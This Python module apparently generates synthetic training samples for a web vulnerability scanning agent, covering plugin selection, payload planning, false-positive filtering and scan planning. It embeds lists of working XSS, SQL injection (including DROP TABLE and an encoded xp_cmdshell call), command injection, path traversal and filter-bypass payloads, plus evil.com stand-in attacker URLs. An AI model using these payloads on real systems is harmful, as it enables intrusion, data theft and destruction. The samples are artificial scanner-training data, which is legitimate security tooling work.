"""
학습 데이터 생성기.

각 태스크(A-D)에 대한 합성 JSONL 샘플을 생성합니다.
실제 취약점 앱(DVWA, Juice Shop, WebGoat) 패턴 기반.

사용법:
    python -m s2nagent.data.generator --output dataset.jsonl --count 4000
    python -m s2nagent.data.generator --task a --count 800 --output xss_select.jsonl
"""

from __future__ import annotations

import argparse
import json
import random
import sys
from pathlib import Path
from typing import Iterator

from s2nagent.constants import PLUGINS as _PLUGINS, SEVERITIES as _SEVERITIES
from s2nagent.data.schemas import (
    TASK_A_SYSTEM, TASK_B_SYSTEM, TASK_C_SYSTEM, TASK_D_SYSTEM,
    make_sample,
)

_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<iframe src=javascript:alert(1)>",
    "'><script>alert(String.fromCharCode(88,83,83))</script>",
    "<body onload=alert(1)>",
    "';alert(1)//",
]

_SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users--",
    "1' AND SLEEP(5)--",
    "' UNION SELECT null,null,null--",
    "admin'--",
    "' OR 'x'='x",
    "1; SELECT * FROM information_schema.tables--",
]

_CMD_PAYLOADS = [
    "; ls -la",
    "| id",
    "&& whoami",
    "; cat /etc/passwd",
    "$(id)",
    "`id`",
    "; ping -c 1 127.0.0.1",
    "| uname -a",
]

_PATH_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",
]

_PLUGIN_PAYLOADS: dict[str, list[str]] = {
    "xss": _XSS_PAYLOADS,
    "sqlinjection": _SQLI_PAYLOADS,
    "oscommand": _CMD_PAYLOADS,
    "path_traversal": _PATH_PAYLOADS,
    "csrf": ["<form action='http://evil.com' method='POST'>"],
    "file_upload": ["shell.php", "backdoor.jsp", "malware.php5"],
    "jwt": ["eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."],
    "brute_force": ["admin:admin", "admin:password", "root:root"],
    "soft_brute_force": ["admin:password123", "user:qwerty"],
    "autobot": ["<script src=//evil.com/xss.js>"],
    "sensitive_files": ["/.git/config", "/.env", "/config.php.bak"],
    "react2shell": ["{{7*7}}", "${7*7}"],
}

_DOM_TEMPLATES = [
    "<input name='{param}' type='text' value=''>",
    "<textarea name='{param}'></textarea>",
    "<input name='{param}' type='search'>",
    "<form><input name='{param}' type='hidden' value='x'></form>",
    "<input type='file' name='{param}'>",
    "<input type='password' name='{param}'>",
    "<select name='{param}'><option>1</option></select>",
]

_PARAMS = ["q", "search", "id", "page", "file", "user", "token", "cmd", "path", "name", "url"]

_URLS = [
    "/search?q=test",
    "/profile?id=1",
    "/admin/panel",
    "/upload",
    "/api/v1/user",
    "/login",
    "/page?file=index.php",
    "/cmd?exec=ls",
    "/download?path=report.pdf",
    "/.git/config",
]


# ── Task A 샘플 생성 ─────────────────────────────────────────────────────────

def _task_a_samples(n: int) -> Iterator[dict]:
    """Plugin Selection 샘플."""
    plugin_contexts = [
        ("xss", "/search?q=test", "<input name='q' type='text'>", "3 forms, 0 file inputs, 0 login forms"),
        ("sqlinjection", "/profile?id=1", "<input name='id' type='hidden'>", "1 form, DB error pages"),
        ("file_upload", "/upload", "<input type='file' name='file'>", "1 file input, upload endpoint"),
        ("jwt", "/api/v1/auth", "", "JWT tokens in Authorization header, 2 API endpoints"),
        ("path_traversal", "/page?file=index.php", "<input name='file' value='index.php'>", "file param in URL"),
        ("oscommand", "/cmd?exec=ls", "<input name='exec' type='text'>", "cmd param, shell-like endpoint"),
        ("csrf", "/profile/edit", "<form method='POST'>", "state-changing form, no CSRF token"),
        ("brute_force", "/login", "<input type='password' name='pass'>", "1 login form"),
        ("sensitive_files", "/.git/config", "", "directory listing, config files exposed"),
        ("react2shell", "/render?template={{name}}", "", "template parameter in URL"),
        ("autobot", "/search", "<script>var q='{{query}}'</script>", "reflected input in JS"),
        ("soft_brute_force", "/login", "<input type='password'>", "login form with rate limit hints"),
    ]

    for _ in range(n):
        plugin, url, dom_tpl, sitemap = random.choice(plugin_contexts)
        param = random.choice(_PARAMS)
        dom = dom_tpl.replace("{param}", param)
        confidence = random.randint(75, 98)
        reasons = {
            "xss": f"input[name={param}] detected — reflected XSS likely",
            "sqlinjection": f"numeric id param suggests SQL injection surface",
            "file_upload": "file input found — arbitrary file upload possible",
            "jwt": "JWT auth endpoint — token manipulation attack surface",
            "path_traversal": "file parameter in URL — directory traversal possible",
            "oscommand": "exec/cmd parameter — OS command injection possible",
            "csrf": "state-changing form without CSRF token",
            "brute_force": "login form detected — credential brute force",
            "sensitive_files": ".git/config exposed — source code leak",
            "react2shell": "template injection pattern in URL",
            "autobot": "reflected input in JavaScript context",
            "soft_brute_force": "login form with weak rate limiting",
        }
        user = json.dumps({
            "url": url,
            "dom": dom,
            "sitemap_summary": sitemap,
        }, ensure_ascii=False)
        assistant = json.dumps({
            "plugin": plugin,
            "confidence": confidence,
            "reason": reasons.get(plugin, "vulnerability pattern detected"),
        }, ensure_ascii=False)
        yield make_sample(TASK_A_SYSTEM, f"Select the best security plugin for this web context:\n{user}", assistant)


# ── Task B 샘플 생성 ─────────────────────────────────────────────────────────

_BYPASS_VARIANTS: dict[str, list[str]] = {
    "xss": [
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "<scr\x00ipt>alert(1)</scr\x00ipt>",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "<svg/onload=&#97;lert(1)>",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    ],
    "sqlinjection": [
        "' OR 1=1-- -",
        "%27 OR %271%27%3D%271",
        "' OR/**/'1'='1",
        "';EXEC(CHAR(0x78,0x70,0x5f,0x63,0x6d,0x64,0x73,0x68,0x65,0x6c,0x6c))--",
        "1 AND SLEEP(5)#",
    ],
    "oscommand": [
        "%3B+id",
        "|+whoami",
        "`id`",
        "$(id)",
        "%0aid",
    ],
    "path_traversal": [
        "..%2F..%2Fetc%2Fpasswd",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    ],
}

_CONTEXT_NOTES: dict[str, str] = {
    "html_body":      "No quote escaping needed; inject directly",
    "html_attribute": "Close the attribute with \" or ' before injecting",
    "js_string":      "Escape the string with \\' or \"; use \\n for line break",
    "url_param":      "URL-encode special characters; double-encode for bypass",
    "json_value":     "Escape JSON string; \\\" for quote injection",
    "sql_string":     "Single-quote injection; comment with -- or #",
    "sql_numeric":    "No quotes needed; inject directly after numeric value",
    "shell_arg":      "Semicolon/pipe/backtick for command chaining",
    "path_segment":   "Use ../ traversal or null bytes",
}


def _task_b_samples(n: int) -> Iterator[dict]:
    """Payload Planning 샘플 (Week 3: bypass_variants + context_notes 추가)."""
    contexts = [
        "html_body", "html_attribute", "js_string", "url_param",
        "json_value", "xml_node", "sql_string", "sql_numeric", "shell_arg", "path_segment",
    ]

    dom_samples = [
        "<input name='{param}' type='text' value=''>",
        "<input name='{param}' type='hidden' value='1'>",
        "<textarea name='{param}'></textarea>",
        "<input name='{param}' type='search' placeholder='Search...'>",
        "",  # DOM 없는 경우
    ]

    response_samples = {
        "xss": ["Input reflected: {p}", "Search results for {p}", ""],
        "sqlinjection": ["DB Error: {p}", "SQL syntax error near {p}", ""],
        "oscommand": ["Output: {p}", "Command result: {p}", ""],
        "path_traversal": ["File not found: {p}", "Cannot open {p}", ""],
    }

    strategy_map = {
        "xss": "Inject script tags and event handlers targeting reflection points",
        "sqlinjection": "Boolean-based blind then time-based, escalate to UNION",
        "oscommand": "Pipe and semicolon delimiters with id/whoami confirmation",
        "path_traversal": "Relative path traversal with encoding bypass",
        "csrf": "Cross-origin form submission without token",
        "file_upload": "Bypass extension filters with double extensions",
        "jwt": "Algorithm confusion attack (none/HS256 with RS256 key)",
        "brute_force": "Credential list attack on login endpoint",
        "soft_brute_force": "Slow credential test respecting rate limits",
        "autobot": "Reflect user input back through stored/reflected vectors",
        "sensitive_files": "Common backup and configuration file paths",
        "react2shell": "Server-side template injection via template syntax",
    }

    for _ in range(n):
        plugin = random.choice(_PLUGINS)
        param = random.choice(_PARAMS)
        context = random.choice(contexts)
        dom_tpl = random.choice(dom_samples).replace("{param}", param)
        payloads_pool = _PLUGIN_PAYLOADS.get(plugin, ["test"])
        selected = random.sample(payloads_pool * 3, min(len(payloads_pool), random.randint(4, 8)))
        bypass = random.sample(
            _BYPASS_VARIANTS.get(plugin, ["test"]) * 3,
            min(len(_BYPASS_VARIANTS.get(plugin, ["test"])), random.randint(2, 5)),
        )
        context_note = _CONTEXT_NOTES.get(context, "Standard injection context")

        user_data: dict = {"plugin": plugin, "parameter": param, "injection_context": context}
        if dom_tpl:
            user_data["dom_snippet"] = dom_tpl
        resp_list = response_samples.get(plugin, [""])
        resp = random.choice(resp_list).replace("{p}", selected[0] if selected else "")
        if resp:
            user_data["response_snippet"] = resp

        user = json.dumps(user_data, ensure_ascii=False)
        assistant = json.dumps({
            "payloads": selected,
            "bypass_variants": bypass,
            "strategy": strategy_map.get(plugin, "Systematic payload testing"),
            "context_notes": context_note,
        }, ensure_ascii=False)
        yield make_sample(TASK_B_SYSTEM, f"Generate optimized security test payloads:\n{user}", assistant)


# ── Task C 샘플 생성 ─────────────────────────────────────────────────────────

def _task_c_samples(n: int) -> Iterator[dict]:
    """False Positive Filter 샘플."""
    confirmed_cases = [
        ("Possible XSS", "<script>alert(1)</script>", "<script>alert(1)</script> reflected in page", "confirmed", "payload reflected without sanitization"),
        ("SQL Error Detected", "You have an error in your SQL syntax", "MySQL error near '1'='1'", "confirmed", "SQL error message exposed"),
        ("Command Injection", "uid=0(root)", "uid=0(root) gid=0(root)", "confirmed", "command output in response"),
        ("Path Traversal", "root:x:0:0", "/etc/passwd content returned", "confirmed", "sensitive file content disclosed"),
        ("JWT None Algorithm", "eyJhbGciOiJub25lIn0", "Access granted with none algorithm", "confirmed", "authentication bypass confirmed"),
        ("File Upload RCE", "<?php echo system", "PHP code executed", "confirmed", "RCE via file upload"),
    ]
    fp_cases = [
        ("Possible SQLi", "error: near syntax", "Welcome to our website! Enjoy browsing.", "likely_false_positive", "error not present in response body"),
        ("Possible XSS", "<script>alert(1)</script>", "Page rendered normally, input sanitized", "likely_false_positive", "payload not reflected in response"),
        ("Possible Command Injection", "; ls -la", "Invalid input. Please try again.", "likely_false_positive", "generic error, no command output"),
        ("CSRF Vulnerability", "missing token", "Request processed, same-site cookies enforced", "likely_false_positive", "SameSite cookie protection present"),
        ("Sensitive File Exposed", "/.git/config found", "404 Not Found", "likely_false_positive", "file returns 404"),
        ("Brute Force Success", "password=admin", "Invalid credentials", "likely_false_positive", "login attempt failed"),
    ]

    all_cases = confirmed_cases + fp_cases
    for _ in range(n):
        case = random.choice(all_cases)
        finding, evidence, body, verdict, reason = case
        confidence = random.randint(80, 97) if verdict == "confirmed" else random.randint(70, 92)
        user = json.dumps({
            "finding": finding,
            "evidence": evidence,
            "response_body": body,
        }, ensure_ascii=False)
        assistant = json.dumps({
            "verdict": verdict,
            "reason": reason,
            "confidence": confidence,
        }, ensure_ascii=False)
        yield make_sample(TASK_C_SYSTEM, f"Is this a real vulnerability or a false positive?\n{user}", assistant)


# ── Task D 샘플 생성 ─────────────────────────────────────────────────────────

def _task_d_samples(n: int) -> Iterator[dict]:
    """Multi-step Planner 샘플."""
    scenarios = [
        (["xss", "csrf"], [{"plugin": "jwt", "severity": "HIGH"}], "admin route /admin/panel discovered", "path_traversal", "admin route suggests privileged file access", "high"),
        (["sqlinjection"], [{"plugin": "sqlinjection", "severity": "CRITICAL"}], "database errors on /api endpoints", "brute_force", "SQLi found — try credential extraction via brute force", "high"),
        (["brute_force", "soft_brute_force"], [], "login form only, no other forms", "stop", "no more attack surface found", "low"),
        (["path_traversal"], [{"plugin": "path_traversal", "severity": "HIGH"}], "config files accessible", "sensitive_files", "path traversal found — enumerate sensitive files", "high"),
        (["xss", "sqlinjection", "csrf"], [{"plugin": "xss", "severity": "MEDIUM"}], "3 forms, 1 file upload", "file_upload", "file upload endpoint not yet tested", "medium"),
        (["jwt"], [{"plugin": "jwt", "severity": "HIGH"}], "JWT auth, admin panel at /admin", "oscommand", "authenticated endpoint may have command injection", "medium"),
        (["sensitive_files", "path_traversal", "sqlinjection", "xss", "csrf", "brute_force", "jwt", "file_upload"], [{"plugin": "xss", "severity": "LOW"}], "all major vectors tested", "stop", "comprehensive scan complete, no critical findings", "low"),
        (["autobot"], [{"plugin": "autobot", "severity": "MEDIUM"}], "React SPA with dynamic rendering", "react2shell", "React app may have server-side rendering — SSTI possible", "medium"),
    ]

    for _ in range(n):
        completed, findings, sitemap, action, reason, priority = random.choice(scenarios)
        # 약간의 variation
        completed_sample = completed[:random.randint(1, len(completed))]
        user = json.dumps({
            "completed_plugins": completed_sample,
            "findings_summary": findings,
            "sitemap_summary": sitemap,
        }, ensure_ascii=False)
        assistant = json.dumps({
            "next_action": action,
            "reason": reason,
            "priority": priority,
        }, ensure_ascii=False)
        yield make_sample(TASK_D_SYSTEM, f"Plan the next scan action:\n{user}", assistant)


# ── 통합 생성기 ─────────────────────────────────────────────────────────────

class DatasetGenerator:
    """
    전체 학습 데이터셋 생성기.

    count 파라미터로 생성할 총 샘플 수를 지정합니다.
    태스크별 비율은 plan.md §6 기준입니다.
    """

    # 태스크별 비율 (합계 = 1.0)
    _RATIOS = {
        "a": 0.30,  # Plugin Selection (XSS 800 + SQLi 800 = 1600/4000 → 40%)... 약화하여 균형
        "b": 0.20,  # Payload Planning
        "c": 0.30,  # False Positive Filter
        "d": 0.20,  # Multi-step Planner
    }

    def generate(self, count: int = 4000) -> list[dict]:
        samples: list[dict] = []
        counts = {task: int(count * ratio) for task, ratio in self._RATIOS.items()}
        # 반올림 오차 보정
        counts["a"] += count - sum(counts.values())

        samples.extend(_task_a_samples(counts["a"]))
        samples.extend(_task_b_samples(counts["b"]))
        samples.extend(_task_c_samples(counts["c"]))
        samples.extend(_task_d_samples(counts["d"]))

        random.shuffle(samples)
        return samples

    def generate_task(self, task: str, count: int) -> list[dict]:
        """단일 태스크 샘플 생성."""
        generators = {
            "a": _task_a_samples,
            "b": _task_b_samples,
            "c": _task_c_samples,
            "d": _task_d_samples,
        }
        gen = generators.get(task.lower())
        if gen is None:
            raise ValueError(f"Unknown task: {task}. Choose from a, b, c, d.")
        return list(gen(count))

    def save(self, samples: list[dict], path: str | Path) -> None:
        """JSONL 파일로 저장."""
        path = Path(path)
        path.parent.mkdir(parents=True, exist_ok=True)
        with path.open("w", encoding="utf-8") as f:
            for s in samples:
                f.write(json.dumps(s, ensure_ascii=False) + "\n")
        print(f"Saved {len(samples)} samples → {path}")


# ── CLI ──────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="S2N-Agent 학습 데이터 생성기")
    parser.add_argument("--output", "-o", default="dataset.jsonl", help="출력 JSONL 파일 경로")
    parser.add_argument("--count", "-n", type=int, default=4000, help="생성할 샘플 수")
    parser.add_argument("--task", "-t", choices=["a", "b", "c", "d"], default=None, help="특정 태스크만 생성")
    parser.add_argument("--seed", type=int, default=42, help="난수 시드")
    args = parser.parse_args()

    random.seed(args.seed)
    gen = DatasetGenerator()

    if args.task:
        samples = gen.generate_task(args.task, args.count)
    else:
        samples = gen.generate(args.count)

    gen.save(samples, args.output)


if __name__ == "__main__":
    main()
